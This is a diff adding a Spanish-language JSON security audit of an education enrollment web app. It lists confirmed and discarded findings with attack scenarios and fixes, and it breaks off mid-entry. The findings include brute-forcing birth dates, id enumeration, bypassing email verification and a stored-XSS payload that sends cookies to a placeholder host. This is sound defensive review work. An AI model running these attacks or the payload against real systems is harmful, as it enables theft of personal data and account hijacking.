@@ -1,0 +1,964 @@
+{
+ "areas": [
+  {
+   "area": "Seguridad y autorización",
+   "confirmados": [
+    {
+     "titulo": "La inscripción devuelve al navegador el mismo token que valida el correo, así que la verificación por email se puede saltar",
+     "severidad": "alta",
+     "archivo": "app/api/capacitaciones/inscribirse/[capacitacion]/route.ts",
+     "linea": 386,
+     "escenario": "Un atacante hace POST /api/capacitaciones/inscribirse/X con la cédula de un tercero y un correo ajeno (por ejemplo victima@x.com). La respuesta trae `token` (línea 386; la página lo usa para ir a /verificacion/esperando/${token}). El atacante llama de inmediato POST /api/verificacion/validar/{token}. Resultado: la inscripción queda creada, estudiantes.correo_verificado pasa a true para un correo que nunca abrió el enlace y la víctima recibe correos que no pidió.",
+     "correccion": "No devolver el token de validación. Generar un identificador aparte solo para consultar el estado (un `poll_id` aleatorio guardado en otra columna) y que /verificacion/estado lo acepte. /verificacion/validar debe seguir aceptando solo el token que llega por correo.",
+     "verificacion": "Confirmado. inscribirse/[capacitacion]/route.ts:386 devuelve `token` en el JSON. POST /api/verificacion/validar/[token] (validar/[token]/route.ts:45-112) solo comprueba que el token exista, no esté usado y no haya vencido. No pide cookie, sesión ni prueba de que se tenga el buzón: marca correo_verificado=true y crea la inscripción. Así la verificación por correo no prueba nada. Lo bajo a alta porque el daño es una inscripción falsa o no verificada, no una fuga de datos. Corrección: no devolver el token, usar un id opaco para la página de espera y consultar el estado por polling."
+    },
+    {
+     "titulo": "El resultado biométrico lo envía el cliente y el servidor lo guarda como verificado sin comprobarlo",
+     "severidad": "alta",
+     "archivo": "app/api/capacitaciones/inscribirse/[capacitacion]/route.ts",
+     "linea": 40,
+     "escenario": "El body incluye `biometria: {valido: true, id_auditoria: \"x\", score_similitud: 0.99}`. El servidor no revisa este resultado con el Hub ni compara biometria.cedula con estudiante.cedula. Lo guarda en estudiantes.biometria_verificada=true y en la metadata del token. Después validar/[token] (línea 136) crea la inscripción en estado 1 (NUEVA) con biometria_verificada=true, en lugar de 6 (PENDIENTE_VALIDACION). Así una persona suplantada evita la revisión presencial y el admin ve «biométrica» en el detalle.",
+     "correccion": "No confiar en lo que envíe el cliente. En /api/biometria/token, guardar en el servidor el resultado del Hub (tabla o caché indexada por id_auditoria con su cédula y expiración) o firmarlo con HMAC. En inscribirse, aceptar solo un id_auditoria que el servidor haya registrado, que no esté vencido ni usado y cuya cédula coincida con estudiante.cedula. En cualquier otro caso usar el método manual.",
+     "verificacion": "Confirmado. En la línea 40, esBiometricaValida se calcula solo con biometria.valido y biometria.id_auditoria, que vienen del body. id_auditoria solo se usa en estas rutas y ninguna lo valida contra el Hub (no hay una llamada del servidor que compruebe la auditoría ni la cédula). Luego validar/[token]:131-137 crea la inscripción en estado 1 con biometria_verificada=true, cuando debería quedar en 6. Así se evita la revisión manual de identidad. Es alta, no crítica: no hay fuga de datos. Corrección: que el servidor obtenga el resultado del Hub con id_auditoria y compare la cédula, o guardar el resultado en el servidor en app/api/biometria y referenciarlo."
+    },
+    {
+     "titulo": "PUT /api/verificar/[cedula] no pide Turnstile ni limita intentos: se puede adivinar la fecha de nacimiento y obtener los datos personales",
+     "severidad": "critica",
+     "archivo": "app/api/verificar/[cedula]/route.ts",
+     "linea": 169,
+     "escenario": "El GET exige Turnstile, pero el PUT no, y los dos llaman a lookupCedulaRecord (línea 192). Un script prueba PUT /api/verificar/8-123-456 con {fechaNacimiento} recorriendo unas 30 000 fechas. Al acertar recibe `estudiante` con id, correo, telefono, sexo, estado_civil y nombre completo. Si la cédula no está en la BD, cada intento consulta la API del Tribunal Electoral con la clave de INADEH, lo que puede agotar la cuota o bloquear la clave. Además, el `id` obtenido sirve para el ataque del hallazgo siguiente.",
+     "correccion": "Exigir Turnstile también en el PUT, o un token firmado de un solo uso emitido por el GET. Limitar los intentos por cédula y por IP (por ejemplo, 5 fallos y bloqueo de 15 min en una tabla). Guardar en caché la respuesta del TE para no consultarla en cada intento. En la respuesta, devolver correo y teléfono enmascarados.",
+     "verificacion": "Confirmado. El GET (línea 122) exige Turnstile y el PUT (línea 169) no. No existe ningún limitador de intentos en el repo (grep de rateLimit sin resultados). El PUT llama a lookupCedulaRecord, que consulta la BD y, si la cédula no está, la API externa con CEDULA_API_KEY. Al acertar la fecha devuelve id, correo, telefono, sexo y estado_civil (líneas 214-219). Probar fechas por fuerza bruta (unas 36 000 en 100 años, menos si se conoce la edad aproximada) es factible y filtra datos personales. Corrección: exigir Turnstile también en el PUT, limitar intentos por cédula e IP, y no devolver correo ni teléfono completos (enmascararlos)."
+    },
+    {
+     "titulo": "Inscribirse sobrescribe correo, teléfono y nombre de un estudiante existente con solo id + cédula",
+     "severidad": "alta",
+     "archivo": "app/api/capacitaciones/inscribirse/[capacitacion]/route.ts",
+     "linea": 146,
+     "escenario": "El atacante conoce una cédula y recorre estudiante.id=1..N: responde 403 si no coincide y 200 si coincide, sin Turnstile ni límite de intentos. Con el par correcto, el UPDATE de la línea 146 reemplaza correo, telefono, nombres, apellidos y la ubicación de la víctima por los del atacante. correo_verificado sigue en true aunque el correo cambió. Con el token devuelto en la respuesta, el atacante también controla la verificación.",
+     "correccion": "Para un estudiante existente, exigir la prueba del paso PUT /api/verificar (un token firmado de corta duración emitido tras confirmar la fecha de nacimiento) en lugar de id + cédula. No actualizar nombres ni apellidos desde el cliente (vienen del TE). Si cambia el correo, poner correo_verificado=false y enviar la verificación al correo anterior o al nuevo según la política. Añadir Turnstile y límite de intentos.",
+     "verificacion": "Confirmado. Las líneas 98-156 solo exigen que estudiante.id exista y que la cédula enviada sea igual a la guardada. Responde 404 si el id no existe y 403 si la cédula no coincide, sin captcha ni límite, así que el par id-cédula se puede descubrir (o sacar el id del PUT del hallazgo 2). El UPDATE de la línea 146 cambia correo, telefono, nombres y apellidos y nunca vuelve a poner correo_verificado=false. Con el token devuelto (hallazgo 0), el atacante valida él mismo. Corrección: no actualizar datos personales sin una prueba ligada a la sesión (un token firmado que emita el PUT de verificar) y poner correo_verificado=false si cambia el correo."
+    },
+    {
+     "titulo": "POST /api/verificacion/reenviar (opción 2) envía correos a cualquier estudiante con metadata elegida por el atacante",
+     "severidad": "alta",
+     "archivo": "app/api/verificacion/reenviar/route.ts",
+     "linea": 166,
+     "escenario": "Sin autenticación ni límite, el atacante envía {id_estudiante: 123, tipo: \"inscripcion\", metadata: {capacitacion_id: 9, metodo_validacion: \"biometrica\", biometria: {valido: true, id_auditoria: \"x\"}}}. 1) Invalida los tokens pendientes de la víctima (DoS de su inscripción). 2) Envía correos ilimitados del dominio de INADEH a cualquier id (bombardeo de correo, reputación del SMTP). 3) Si la víctima hace clic, se crea una inscripción en un curso que no eligió, marcada como biométrica y en estado 1.",
+     "correccion": "Eliminar la opción 2 o exigir el token anterior. Construir siempre la metadata en el servidor (desde el token previo) y no aceptarla del body. Validar `tipo` contra una lista permitida. Añadir un límite por estudiante (por ejemplo, 1 reenvío por minuto y 5 por hora) y por IP.",
+     "verificacion": "Confirmado. reenviar/route.ts:116-182 (opción 2) no tiene autenticación, captcha ni límite. Acepta id_estudiante, tipo y metadata del body, invalida los tokens anteriores (línea 155) y crea un token con la metadata del atacante (línea 166) que validar/[token] usa sin revisar: ni la biometría, ni si la capacitación está activa, ni las fechas de inscripción. Esto permite bombardear de correo a cualquier id, anular la inscripción pendiente de la víctima y, si la víctima hace clic, inscribirla con biometria=true. Corrección: quitar la opción 2 o exigir el token anterior y reconstruir la metadata en el servidor."
+    },
+    {
+     "titulo": "Fuera de usuarios y roles, la API admin no comprueba el rol: Relaciones Públicas (rol 4) y CIEPI (rol 3) pueden hacer cualquier acción administrativa",
+     "severidad": "media",
+     "archivo": "app/api/admin/newsletter/enviar/route.ts",
+     "linea": 17,
+     "escenario": "El middleware y las rutas solo comprueban token.isAdmin, que vale true para todo usuario de usuarios_administradores. Un usuario con rol 4 puede llamar POST /api/admin/newsletter/enviar y enviar HTML arbitrario a todos los suscriptores. También puede borrar sedes, edificios y aulas (DELETE /api/admin/sedes/[id]), editar capacitaciones, leer consultas con nombre, correo y teléfono de ciudadanos, y matricular o rechazar inscripciones (PUT /api/admin/inscripciones/[id] solo valida el grafo, no el rol, y además usa el rolId del JWT, que puede estar desactualizado). Esto lleva al nivel de la API el pendiente conocido «el menú no filtra por rol».",
+     "correccion": "Crear `requireRole(...roles)` en lib/adminAuth.ts que lea rol_id y activo de la BD. Aplicarlo por ruta según una matriz explícita: newsletter, sedes, aulas, edificios, inscripciones y capacitaciones para roles 1 y 2; el blog según permissions.ts. Usar el rol de la BD en inscripciones en lugar de session.user.rolId.",
+     "verificacion": "Confirmado. El middleware y requireAdmin (lib/adminAuth.ts) solo comprueban isAdmin. newsletter/enviar:17 tampoco comprueba el rol. Solo blog, usuarios, roles e inscripciones/[id] consultan rolId. Inscripciones/[id] usa session.user.rolId del JWT, mientras que blog/[id] relee el rol de la BD. Un detalle: el HTML del boletín pasa por sanitizeNewsletterHtml, así que no es «HTML arbitrario». Es un ángulo nuevo frente al pendiente «el menú no filtra por rol» (ahora a nivel de API). La bajo a media porque exige ser un funcionario autenticado en usuarios_administradores. Corrección: un helper requireRole([...]) por ruta que lea el rol de la BD."
+    },
+    {
+     "titulo": "Blog: se pueden saltar los permisos de edición con valores vacíos, el autor puede editar un blog publicado y CIEPI puede cambiar el estado de blogs ajenos",
+     "severidad": "media",
+     "archivo": "app/api/admin/blog/[id]/route.ts",
+     "linea": 152,
+     "escenario": "La comprobación de permisos usa valores truthy (`if (titulo || contenido || ...)`), pero el UPDATE usa `!== undefined`. Un usuario de rol 4, o uno que no es el autor, envía {titulo: \"\", contenido: null, imagen_banner: \"\"} y vacía cualquier blog, incluso uno publicado. Además, el autor puede cambiar el contenido de un blog en estado 6 (PUBLICADO) sin pasar otra vez por CIEPI ni RP. La verificación de propiedad que promete permissions.ts («verificado en otra parte») no existe: un usuario CIEPI puede pasar el blog de otro autor de 2 a 3 o de 2 a 4, o aprobar el suyo propio. El UPDATE tampoco lleva `AND estado = $actual`, así que dos revisores simultáneos se pisan.",
+     "correccion": "Comprobar con `!== undefined`. Bloquear la edición de contenido en los estados 2, 4 y 6 salvo para roles 1 y 2, o devolver el blog a borrador al editarlo. Para el rol 3, exigir que no sea el autor al revisar (separación de funciones), o que sea el autor solo en la transición 1→2. Añadir `WHERE id=$n AND estado=$estadoActual` y responder 409 si rowCount=0.",
+     "verificacion": "Confirmado. En blog/[id]/route.ts:152, la comprobación `if (titulo || contenido || imagen_banner || palabras_clave)` es truthy, pero el UPDATE (líneas 200-222) usa `!== undefined`. Con {titulo:\"\"} cualquier usuario (incluido el rol 4 o quien no es el autor) vacía el título, y contenido:null guarda 'null'. El autor puede editar un blog en estado 6 porque no se revisa el estado al editar contenido. validateBlogStateTransition (permissions.ts:143) no revisa la propiedad, aunque el comentario de la línea 64 dice que se verifica en otra parte. El UPDATE no lleva AND estado=$actual. Corrección: comprobar con `!== undefined`, prohibir editar en estados 2, 4 y 6 salvo admin, y añadir una guarda optimista sobre el estado."
+    },
+    {
+     "titulo": "XSS guardado en el JSON-LD del detalle público del blog",
+     "severidad": "media",
+     "archivo": "components/JsonLdScript.tsx",
+     "linea": 18,
+     "escenario": "JSON.stringify no escapa `<`, y sanitizeForJsonLd solo escapa comillas y barras. Un blog con titulo `</script><script>fetch('//x/'+document.cookie)</script>`, o con palabras_clave o autor_nombre maliciosos, rompe el <script type=application/ld+json> en /blog/[id]. Como la CSP permite 'unsafe-inline', el script se ejecuta para todos los visitantes una vez publicado. sanitizeForJsonLd además escapa dos veces las comillas, así que en el JSON-LD queda un `\\\"` literal.",
+     "correccion": "Serializar con `JSON.stringify(data).replace(/</g, \"\\\\u003c\").replace(/>/g, \"\\\\u003e\").replace(/&/g, \"\\\\u0026\")`. Eliminar sanitizeForJsonLd (aplicado a strings sobra y rompe el contenido).",
+     "verificacion": "Confirmado. JsonLdScript.tsx:12-18 inserta JSON.stringify(data) con dangerouslySetInnerHTML sin escapar `<`. sanitizeForJsonLd (lib/security.ts:104-117) solo escapa barras, comillas y saltos de línea, y como JSON.stringify vuelve a escapar, las comillas quedan escapadas dos veces. Un titulo con `</script><script>...` cierra el bloque, y la CSP (next.config) permite 'unsafe-inline'. Exige un autor interno y que el blog pase la aprobación, así que media es correcta. Corrección: JSON.stringify(data).replace(/</g,'\\\\u003c') y quitar sanitizeForJsonLd."
+    },
+    {
+     "titulo": "reCAPTCHA y Turnstile son opcionales: se omiten si falta el token o la clave",
+     "severidad": "media",
+     "archivo": "app/api/newsletter/suscribir/route.ts",
+     "linea": 64,
+     "escenario": "Si se envía POST /api/newsletter/suscribir sin recaptchaToken, se salta la verificación y se manda un correo de confirmación a cualquier dirección, sin límite (también reenvía a direcciones en estado «pendiente»). Esto permite bombardear de correo y daña la reputación del SMTP institucional. Lo mismo ocurre en contacto/consulta (línea 88), donde se puede inundar ciepi.consultas. Además, verifyTurnstileToken (lib/turnstile.ts:15) devuelve success si falta TURNSTILE_SECRET_KEY: si en producción se olvida la variable, mentorías y verificar quedan sin protección y no se avisa.",
+     "correccion": "Si la clave está configurada, exigir el token. En NODE_ENV=production, que la ausencia de la clave falle de forma cerrada (o al arrancar). Añadir un límite por correo (por ejemplo, 1 confirmación cada 10 min) y por IP.",
+     "verificacion": "Confirmado. newsletter/suscribir:64 y contacto/consulta:88 solo verifican reCAPTCHA `if (recaptchaToken)`, así que basta omitirlo. El newsletter vuelve a poner en 'pendiente' y reenvía el correo de confirmación a cualquier dirección no activa, sin límite. lib/turnstile.ts:14-16 devuelve success:true, skipped:true si falta TURNSTILE_SECRET_KEY, sin avisar. Corrección: exigir el token cuando la clave está configurada, fallar en producción si falta la clave y limitar intentos por IP y por correo."
+    },
+    {
+     "titulo": "El estado «Pendiente de validación» se busca por nombre y puede crearse con un id distinto de 6, lo que rompe la máquina de estados de inscripciones",
+     "severidad": "baja",
+     "archivo": "app/api/verificacion/validar/[token]/route.ts",
+     "linea": 22,
+     "escenario": "getPendienteValidacionEstadoId toma el primer estado cuyo nombre empieza por «pendiente», o inserta uno con MAX(id)+1. Si la BD no tiene el id 6 con ese nombre, o hay otro «Pendiente...» con un id menor, las inscripciones manuales quedan en un estado que lib/inscripcionStates.ts considera inválido (isValidInscripcionState=false). El admin no puede moverlas: recibe «Estado de inscripción inválido».",
+     "correccion": "Usar la constante InscripcionState.PENDIENTE_VALIDACION (6) y asegurar con una migración que exista esa fila. Eliminar la búsqueda por nombre y el INSERT en tiempo de ejecución.",
+     "verificacion": "El código y la migración (database/add_pendiente_validacion_estado.sql) buscan por LIKE 'pendiente%' y crean el estado con MAX(id)+1. En cambio, lib/inscripcionStates.ts fija PENDIENTE_VALIDACION=6 y isValidInscripcionState solo acepta 1-6. Si la BD de producción tiene más de 5 estados, o un 'Pendiente...' con otro id, las inscripciones manuales quedan en un id que la máquina de estados rechaza. Depende de los datos de producción, así que baja es correcta. Corrección: usar el id 6 fijo (InscripcionState.PENDIENTE_VALIDACION) y que la migración inserte el id 6 de forma explícita."
+    }
+   ],
+   "descartados": [
+    {
+     "titulo": "Redirección abierta tras el login en el callback redirect de NextAuth",
+     "archivo": "lib/authOptions.ts",
+     "motivo": "La comprobación `url.startsWith(baseUrl)` de authOptions.ts:140 es débil (aceptaría https://ciepi.inadeh.edu.pa.evil.com), pero el escenario descrito no ocurre. app/admin/login/page.tsx:36-38 ignora el callbackUrl de la URL y siempre llama a signIn('azure-ad', {callbackUrl: '/admin/capacitaciones'}), lo que también sobrescribe la cookie callback-url antes del flujo OAuth. No encontré otra vía alcanzable sin CSRF. Conviene igualmente cambiar a `new URL(url).origin === baseUrl` como endurecimiento."
+    }
+   ]
+  },
+  {
+   "area": "Flujo de inscripción",
+   "confirmados": [
+    {
+     "titulo": "La API de inscripción devuelve el token de verificación de correo al navegador y cambia el correo del estudiante antes de verificarlo",
+     "severidad": "critica",
+     "archivo": "app/api/capacitaciones/inscribirse/[capacitacion]/route.ts",
+     "linea": 386,
+     "escenario": "Un atacante conoce la cédula de un estudiante existente y su id, que es un entero secuencial: puede probar ids hasta que deje de recibir 403 en la línea 117. Envía POST con estudiante {id, cedula, correo: 'atacante@x.com', nombres: 'X'}. La línea 144 hace UPDATE de correo, telefono, nombres y apellidos en el acto, sin tocar correo_verificado. La respuesta incluye `token` (línea 386), y con él el atacante llama a POST /api/verificacion/validar/{token}. Así marca correo_verificado=true sobre su propio correo y crea la inscripción sin abrir nunca un correo. Resultado: la verificación por correo no sirve de nada, y el registro de la víctima queda secuestrado (correo, nombre y teléfono cambiados) con la marca de verificado.",
+     "correccion": "No devolver el token de verificación. Para la página de espera, devolver un id de sondeo opaco distinto, guardado en otra columna, que solo permita leer el estado. Guardar los cambios de correo y datos personales en la metadata del token y aplicarlos dentro de validar, en una transacción, solo después de verificar el correo. Poner correo_verificado=false cuando cambie el correo.",
+     "verificacion": "Confirmado. route.ts:386 devuelve `token` en el JSON. Las líneas 144-155 actualizan correo, teléfono, nombres y apellidos antes de cualquier verificación, y solo exigen que id y cédula coincidan (línea 114). Las respuestas 404 y 403 (líneas 107 y 118) permiten enumerar ids. validar/[token] solo comprueba el token y pone correo_verificado=true (líneas 107-112). Por tanto, la verificación por correo puede saltarse sin abrir ningún correo."
+    },
+    {
+     "titulo": "El servidor no exige la verificación previa de fecha de nacimiento y acepta cualquier identidad que mande el cliente (suplantación y bloqueo de cédulas)",
+     "severidad": "critica",
+     "archivo": "app/api/capacitaciones/inscribirse/[capacitacion]/route.ts",
+     "linea": 236,
+     "escenario": "El paso PUT /api/verificar/{cedula}, que compara la fecha de nacimiento, solo vive en la máquina de estados del cliente. El POST de inscripción no comprueba que haya ocurrido. Un atacante envía POST sin estudiante.id, con la cédula X de otra persona que aún no está en ciepi.estudiantes, fecha_nacimiento='2000-01-01', nombres falsos y su propio correo. Se hace el INSERT (línea 236). Cuando el verdadero titular intenta inscribirse, PUT /api/verificar ahora lee la fecha falsa de la BD (lookupCedulaRecord da prioridad a la BD) y nunca coincide. El titular queda bloqueado para siempre, y su intento de alta recibe un 409 'Cédula duplicada'.",
+     "correccion": "Hacer que PUT /api/verificar emita una prueba firmada de corta duración (JWT/HMAC o fila en BD con nonce) con la cédula y los datos del Tribunal Electoral. Que la inscripción exija esa prueba y tome cedula, nombre_cedula, nombres, apellidos, sexo y fecha_nacimiento del registro del servidor, no del cuerpo de la petición.",
+     "verificacion": "Confirmado. El POST no comprueba que haya pasado el PUT de /api/verificar. Si no llega estudiante.id, hace el INSERT (línea 236) con la cédula, la fecha de nacimiento y los nombres que mande el cliente. lookupCedulaRecord (verificar/[cedula]/route.ts:42-53) da prioridad a la BD, así que el titular real ya no puede pasar la comprobación de fecha. Su alta, a su vez, recibe un 409 por estudiantes_cedula_unique."
+    },
+    {
+     "titulo": "La validación biométrica se acepta tal como la envía el cliente, sin comprobarla en el servidor ni ligarla a la cédula",
+     "severidad": "alta",
+     "archivo": "app/api/capacitaciones/inscribirse/[capacitacion]/route.ts",
+     "linea": 40,
+     "escenario": "Un cliente envía biometria: {valido: true, id_auditoria: 'cualquiera'} y metodo_validacion 'biometrica', sin haber pasado por el Hub. esBiometricaValida queda en true (línea 40). Las líneas 157-166 marcan estudiantes.biometria_verificada=true. Luego validar crea la inscripción con estado 1 (Nueva) y biometria_verificada=true en lugar de 6 (Pendiente), y se salta la revisión manual del administrador. Además, aunque la biometría sea real, nunca se compara su cédula (biometriaResult.cedula) con la cédula que se inscribe.",
+     "correccion": "Hacer el canje del code en /api/biometria/token y guardar el resultado en el servidor (tabla o sesión firmada) con la cédula devuelta por el Hub. Devolver al cliente solo un identificador opaco. En la inscripción, leer el resultado del servidor y exigir que su cédula coincida con la inscrita. No reenviar access_token al navegador.",
+     "verificacion": "Confirmado. esBiometricaValida (líneas 40-42) solo mira biometria.valido e id_auditoria, que vienen del cliente. No se valida el access_token ni se compara biometria.cedula con estudiante.cedula. validar crea la inscripción con estado 1 y biometria_verificada=true. La bajo a alta: el estado 1 (Nueva) todavía requiere que un administrador matricule; lo que se falsifica es la marca de identidad y se evita el estado 6."
+    },
+    {
+     "titulo": "PUT /api/verificar/[cedula] no tiene Turnstile ni límite de intentos: se puede adivinar la fecha de nacimiento por fuerza bruta y filtrar datos personales",
+     "severidad": "alta",
+     "archivo": "app/api/verificar/[cedula]/route.ts",
+     "linea": 169,
+     "escenario": "Solo el GET (paso 1) exige Turnstile, y el atacante llama directamente al PUT. Para una cédula conocida prueba fechas DD/MM/YYYY: unas 25 000 peticiones cubren 70 años, sin rate limit ni bloqueo. Al acertar, la respuesta (línea 218) trae el registro completo: correo, teléfono, fecha de nacimiento, sexo y estado civil. Si la cédula no está en la BD, cada intento consulta la API del Tribunal Electoral (lookupCedulaRecord), que agota cuota y sirve como oráculo del padrón.",
+     "correccion": "Exigir Turnstile también en el PUT. Contar los intentos fallidos por cédula y por IP (por ejemplo, bloquear tras 5 fallos durante 15 min). Cachear la consulta externa. No devolver correo ni teléfono completos (enmascararlos) y devolver solo lo que el formulario necesita.",
+     "verificacion": "Confirmado. El PUT (líneas 169-237) no tiene Turnstile y no hay rate limit en ninguna parte: middleware.ts solo cubre /admin. Al acertar, la línea 218 devuelve el registro completo de la BD, incluidos correo y teléfono. Si la cédula no está en la BD, cada intento llama a la API externa (líneas 63-71)."
+    },
+    {
+     "titulo": "Al volver de la biometría se envía la inscripción sin cédula ni datos del estudiante",
+     "severidad": "alta",
+     "archivo": "app/capacitaciones/inscribirse/[id]/page.tsx",
+     "linea": 111,
+     "escenario": "La biometría sale con una redirección completa al Hub, así que al volver la página se monta de cero. Con el resultado guardado en sessionStorage se despacha BIOMETRIA_RETURN y se pasa directo a step 'form', pero estudianteData sigue en null porque nunca se llama al PUT de /api/verificar. En handleSubmit (línea 519), estudiante.cedula = estudianteData?.cedula vale undefined, y estudiante.id y fecha_nacimiento también. El servidor entra en la rama de estudiante nuevo e inserta cedula NULL: o falla con un 500 si la columna es NOT NULL, o crea un estudiante duplicado sin cédula. Un estudiante que ya existe no se reconoce. El camino biométrico, que es el principal, queda roto.",
+     "correccion": "En BIOMETRIA_RETURN, cargar los datos desde el servidor a partir del resultado biométrico verificado en el servidor (ver el hallazgo anterior). Si no, guardar en el estado del flujo la cédula y que el payload use flow.cedula. Mejor aún: que el reductor no permita llegar a 'form' sin identidad cargada, haciendo que BIOMETRIA_RETURN lleve los datos del estudiante.",
+     "verificacion": "Confirmado. La biometría sale con window.location.href (lib/biometria.ts:156), y el callback vuelve con router.push, de modo que la página se monta de nuevo con estudianteData=null. El useEffect (líneas 111-116) solo restaura la cédula en el estado `cedula` y despacha BIOMETRIA_RETURN, que va directo a 'form'. handleSubmit (líneas 518-519) envía id y cedula desde estudianteData?, que valen undefined, así que el servidor entra en la rama de alta con cedula NULL."
+    },
+    {
+     "titulo": "/api/verificacion/reenviar sin autenticación permite enviar correos a cualquier estudiante con metadata arbitraria y reabrir inscripciones ya cerradas",
+     "severidad": "alta",
+     "archivo": "app/api/verificacion/reenviar/route.ts",
+     "linea": 116,
+     "escenario": "Opción 2: POST {id_estudiante: N, tipo: 'inscripcion', metadata: {capacitacion_id: 99, metodo_validacion: 'biometrica', biometria: {valido: true}}}. Envía un correo oficial a cualquier estudiante, con ids secuenciales y sin límite de envíos, lo que sirve para spam o phishing desde el dominio de INADEH. Si la víctima pulsa el enlace, validar crea una inscripción 'biométrica' (estado 1) en la capacitación 99, aunque esté inactiva o fuera de fechas, porque validar (línea 130) no vuelve a comprobar activo ni fechas. La opción 1 (línea 21) también reemite un token nuevo a partir de uno ya usado o caducado, de modo que un token viejo permite inscribirse después de fecha_final_inscripcion.",
+     "correccion": "Quitar la opción 2 o restringirla a administradores. En la opción 1, reemitir solo si el token no se usó, limitar los reenvíos por estudiante y copiar la metadata original sin aceptarla del cliente. En validar, volver a comprobar capacitacion.activo y fecha_final_inscripcion antes de insertar.",
+     "verificacion": "Confirmado. reenviar no tiene autenticación ni límite de envíos. La opción 2 (líneas 116-195) acepta id_estudiante y metadata arbitrarios y envía el correo a ese estudiante. validar (líneas 130-207) no vuelve a comprobar si la capacitación está activa ni sus fechas. La opción 1 (líneas 21-34) reemite un token a partir de cualquiera, aunque esté usado o caducado, porque getTokenInfo no filtra por estado."
+    },
+    {
+     "titulo": "La página de espera queda rota al reenviar y marca como 'verificado' un token que solo fue invalidado",
+     "severidad": "alta",
+     "archivo": "app/verificacion/esperando/[token]/page.tsx",
+     "linea": 121,
+     "escenario": "1) El usuario pulsa 'Reenviar'. La respuesta de reenviar trae data:{correo, fecha_expiracion, duracion_minutos} y no trae token, así que router.replace navega a /verificacion/esperando/undefined, el sondeo recibe 404 y se muestra 'expirado'. 2) invalidatePreviousTokens pone usado=true en el token anterior, y /api/verificacion/estado/[token] (línea 46) informa usado=true como 'verificado'. Si el usuario vuelve a enviar el formulario en otra pestaña, o reenvía, la primera página de espera dice 'Correo verificado exitosamente' y redirige, aunque no exista ninguna inscripción.",
+     "correccion": "Distinguir en BD un token 'invalidado' de uno 'usado', con columna estado o motivo, y que el endpoint de estado devuelva 'reemplazado' en ese caso. Que reenviar devuelva el nuevo id de sondeo (opaco, no el token de verificación) y que la página lo use.",
+     "verificacion": "Confirmado. esperando/page.tsx:121 navega a data.data.token, pero reenviar devuelve data:{correo, fecha_expiracion, duracion_minutos} sin token; el sondeo recibe 404 y la página pasa a 'expirado'. Además, invalidatePreviousTokens pone usado=true (lib/verificationToken.ts:209-212), y estado/[token]/route.ts:46 lo informa como 'verificado'."
+    },
+    {
+     "titulo": "Inscribirse en una segunda capacitación invalida el enlace de la primera",
+     "severidad": "media",
+     "archivo": "app/api/capacitaciones/inscribirse/[capacitacion]/route.ts",
+     "linea": 339,
+     "escenario": "Un estudiante se inscribe en el curso A y, antes de abrir el correo (válido 15 min), se inscribe en el curso B. invalidatePreviousTokens(estudianteId, 'inscripcion') anula el token de A sin mirar capacitacion_id. Al pulsar el enlace de A ve 'Este enlace ya fue usado' y no queda inscrito en A, mientras su página de espera de A muestra 'verificado' (ver el hallazgo anterior).",
+     "correccion": "Invalidar solo los tokens del mismo estudiante, tipo y capacitación, filtrando por metadata->>'capacitacion_id' = $3.",
+     "verificacion": "Confirmado. invalidatePreviousTokens filtra solo por id_estudiante y tipo, sin capacitacion_id. El token del curso A queda con usado=true: validar responde TOKEN_ALREADY_USED y la página de espera de A muestra 'verificado'."
+    },
+    {
+     "titulo": "validar consume el token antes de crear la inscripción y sin transacción; además no hay restricción única ante dobles altas",
+     "severidad": "media",
+     "archivo": "app/api/verificacion/validar/[token]/route.ts",
+     "linea": 87,
+     "escenario": "markTokenAsUsed se ejecuta en la línea 87, y después vienen el UPDATE de estudiantes, getPendienteValidacionEstadoId y el INSERT de la línea 187, cada uno con su propia consulta. Si el INSERT falla (FK de capacitación borrada, error de conexión), el token ya quedó usado: el usuario ve un error, no puede reintentar ('ya fue usado') y la página de espera muestra 'verificado' sin inscripción. Por otro lado, el control de duplicados es solo un SELECT previo. Si dos tokens válidos de la misma capacitación se crean a la vez (doble envío concurrente en que ambos invalidan antes de crear) y se validan, se insertan dos filas en ciepi.inscripciones; no consta ningún índice UNIQUE(id_usuario, id_capacitacion) en database/.",
+     "correccion": "Hacer todo validar en una transacción con un cliente del pool (BEGIN, UPDATE token ... WHERE usado=false RETURNING, INSERT, COMMIT). Crear un índice único (id_usuario, id_capacitacion) y usar INSERT ... ON CONFLICT DO NOTHING/UPDATE.",
+     "verificacion": "Confirmado. markTokenAsUsed se ejecuta en la línea 87, antes del INSERT de la línea 187, y no hay transacción. Si falla algo después, el token ya está consumido. El control de duplicados es un SELECT (líneas 149-154), y en database/ no aparece ningún índice UNIQUE sobre inscripciones(id_usuario, id_capacitacion). Las dobles altas necesitan concurrencia real, así que media es adecuada."
+    },
+    {
+     "titulo": "El id del estado 'Pendiente de validación' se calcula en tiempo de ejecución (MAX+1) y puede no coincidir con el enum 6 del código",
+     "severidad": "baja",
+     "archivo": "app/api/verificacion/validar/[token]/route.ts",
+     "linea": 20,
+     "escenario": "La migración add_pendiente_validacion_estado.sql y getPendienteValidacionEstadoId usan COALESCE(MAX(id),0)+1. Si en producción inscripciones_estados tiene más de 5 filas o huecos, el pendiente queda con id 7, por ejemplo. lib/inscripcionStates.ts fija PENDIENTE_VALIDACION = 6, así que isValidInscripcionState(7) es false y todo PUT /api/admin/inscripciones/{id} sobre esas inscripciones responde 400 'Estado de inscripción inválido': el administrador no puede matricular ni rechazar ninguna inscripción manual. Además, el INSERT en tiempo de ejecución es una carrera: dos validaciones simultáneas sin fila 'pendiente' chocan por PK o crean dos filas.",
+     "correccion": "Sembrar el estado con un id explícito 6 en la migración (INSERT ... VALUES (6, ...) ON CONFLICT DO NOTHING) y en validar usar la constante InscripcionState.PENDIENTE_VALIDACION. Eliminar el INSERT en tiempo de ejecución.",
+     "verificacion": "El código lo confirma: add_pendiente_validacion_estado.sql y getPendienteValidacionEstadoId usan MAX(id)+1, y lib/inscripcionStates.ts fija 6. Pero solo falla si producción no tiene exactamente los estados 1-5, y verificar_migraciones.sql:40-41 ya pide comprobar que sea id 6. Es un riesgo de despliegue que depende de los datos. La carrera del INSERT en tiempo de ejecución es improbable."
+    },
+    {
+     "titulo": "El cambio de estado de inscripción en el admin tiene una carrera (TOCTOU) que se salta la máquina de estados",
+     "severidad": "baja",
+     "archivo": "app/api/admin/inscripciones/[id]/route.ts",
+     "linea": 94,
